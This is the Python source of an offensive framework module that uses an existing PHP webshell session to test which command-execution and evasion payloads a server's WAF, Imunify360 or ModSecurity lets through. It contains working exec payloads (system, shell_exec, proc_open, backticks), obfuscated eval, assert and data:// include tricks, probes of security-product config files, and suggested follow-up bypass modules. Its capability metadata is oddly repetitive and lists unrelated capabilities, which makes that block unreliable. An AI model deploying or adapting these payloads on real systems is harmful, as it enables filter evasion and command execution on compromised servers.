#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Probe WAF / Imunify360 / ModSecurity filters through the active PHP session.

Runs benign-looking and malicious-pattern payloads; reports which execute vs appear blocked.
"""

from __future__ import annotations

from kittysploit import *
from lib.post.php.helpers import PhpPostHelper


class Module(Post, PhpPostHelper):
    __info__ = {
        "name": "Imunify360 / ModSecurity Bypass Probe",
        "description": (
            "Tests a battery of PHP execution and signature payloads through the current "
            "webshell channel to identify WAF/Imunify/ModSecurity blocking and likely bypass angles."
        ),
        "author": "KittySploit Team",
        "arch": Arch.PHP,
        "session_type": SessionType.PHP,
        "tags": ["php", "waf", "modsecurity", "imunify360", "bypass", "manage"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 12,
        'reversible': True,
        'approval_required': True,
        'produces': ['risk_signals', 'exploit_paths'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    probe_set = OptChoice(
        "full",
        "Probe set: quick (exec only), waf (signatures), imunify (paths + exec), full",
        False,
        choices=["quick", "waf", "imunify", "full"],
    )
    stop_on_block = OptBool(False, "Stop after first blocked exec probe", False, advanced=True)

    def _exec_probes(self) -> list:
        return [
            ("exec_system_id", "echo function_exists('system') ? system('id') : 'NO_SYSTEM';", r"uid="),
            ("exec_shell_exec", "echo function_exists('shell_exec') ? shell_exec('id') : 'NO';", r"uid="),
            ("exec_passthru", "if(function_exists('passthru')){ob_start();passthru('id');echo ob_get_clean();}else echo 'NO';", r"uid="),
            ("exec_proc_open", "if(function_exists('proc_open')){$p=proc_open('id',array(1=>array('pipe','w')),$pipes);echo stream_get_contents($pipes[1]);proc_close($p);}else echo 'NO';", r"uid="),
            ("exec_backtick", "echo `id`;", r"uid="),
        ]

    def _waf_probes(self) -> list:
        b64_id = "aWQ="  # id
        return [
            ("sig_union_select", "echo '1 UNION SELECT 1,2,3--';", r"UNION"),
            ("sig_or_1_eq_1", "echo \"' OR 1=1--\";", r"OR 1=1"),
            ("sig_script_alert", "echo '<script>alert(1)</script>';", r"script"),
            ("sig_base64_eval", f"eval(base64_decode('{b64_id}'));", r"uid="),
            ("sig_chr_concat", "echo chr(105).chr(100);", r"\bid\b"),
            ("sig_variable_func", "$f='system'; if(function_exists($f)) $f('id');", r"uid="),
            ("sig_preg_replace_e", "@preg_replace('/.*/e','id', 'x');", r"uid=|NO"),
            ("sig_assert", "@assert('system(\"id\")');", r"uid=|NO"),
            ("sig_create_function", "if(function_exists('create_function')){ $fn=create_function('','return system(\"id\");'); $fn(); } else echo 'NO';", r"uid=|NO"),
            ("sig_include_data", "include 'data://text/plain,<?php echo system(\"id\"); ?>';", r"uid=|NO"),
        ]

    def _imunify_probes(self) -> list:
        paths = [
            "/etc/imunify360/imunify360.conf",
            "/etc/imunify360/agent.json",
            "/etc/imunify360/whitelist.conf",
            "/var/log/imunify360/agent.log",
        ]
        probes = []
        for idx, path in enumerate(paths):
            esc = self.escape_php(path)
            probes.append(
                (
                    f"imunify_readable_{idx}",
                    f"echo is_readable('{esc}') ? 'READABLE:{esc}' : 'NO';",
                    r"READABLE:",
                )
            )
        probes.append(
            (
                "imunify_id_file",
                """
$paths = array('.myimunify_id','/etc/imunify360/.myimunify_id');
foreach ($paths as $p) {
  if (file_exists($p)) { echo 'ID:' . trim(file_get_contents($p)); break; }
}
echo 'NO_ID';
""",
                r"ID:|NO_ID",
            )
        )
        return probes

    def _collect_probes(self) -> list:
        kind = self._opt(self.probe_set) or "full"
        probes = []
        if kind in ("quick", "full"):
            probes.extend(self._exec_probes())
        if kind in ("waf", "full"):
            probes.extend(self._waf_probes())
        if kind in ("imunify", "full"):
            probes.extend(self._imunify_probes())
        if kind == "imunify":
            probes = self._imunify_probes() + self._exec_probes()[:2]
        return probes

    def run(self):
        probes = self._collect_probes()
        print_status(f"Running {len(probes)} WAF/bypass probes via PHP session...")

        ok_count = 0
        blocked = []
        errors = []
        imunify_hits = []

        for name, snippet, expect in probes:
            result = self.probe_php(name, snippet, expect)
            status = result["status"]
            if status == "ok":
                ok_count += 1
                print_success(f"[OK] {name}")
                if name.startswith("imunify"):
                    imunify_hits.append(result.get("output", "")[:200])
            elif status == "error":
                errors.append(name)
                print_warning(f"[ERR] {name}: {result.get('output', '')[:120]}")
            else:
                blocked.append(name)
                print_error(f"[BLOCK] {name}")
            if self.stop_on_block and status == "blocked" and name.startswith("exec_"):
                print_warning("Stopping early (stop_on_block)")
                break

        print_status("=" * 60)
        print_info(f"OK: {ok_count} | BLOCKED: {len(blocked)} | ERROR: {len(errors)}")

        if blocked:
            print_warning("Blocked probes: " + ", ".join(blocked[:15]))
        if ok_count:
            working = [n for n, _, _ in probes if n not in blocked and n not in errors]
            print_success("Working probes: " + ", ".join(working[:15]))

        if imunify_hits:
            print_info("Imunify360 indicators:")
            for hit in imunify_hits[:5]:
                print_info(hit)

        # Suggest follow-up modules
        suggestions = []
        if any(n.startswith("exec_") and n in blocked for n in blocked):
            suggestions.append("Try post/php/exploits/* disable_functions bypass modules")
        if any(n.startswith("sig_base64") and n not in blocked for n, _, _ in probes):
            suggestions.append("Base64 eval not blocked — obfuscated payloads may pass")
        if imunify_hits:
            suggestions.append("Run post/php/gather/enum_imunify for full config extraction")
        if suggestions:
            print_status("Follow-up suggestions:")
            for s in suggestions:
                print_info(f"  - {s}")

        return ok_count > 0
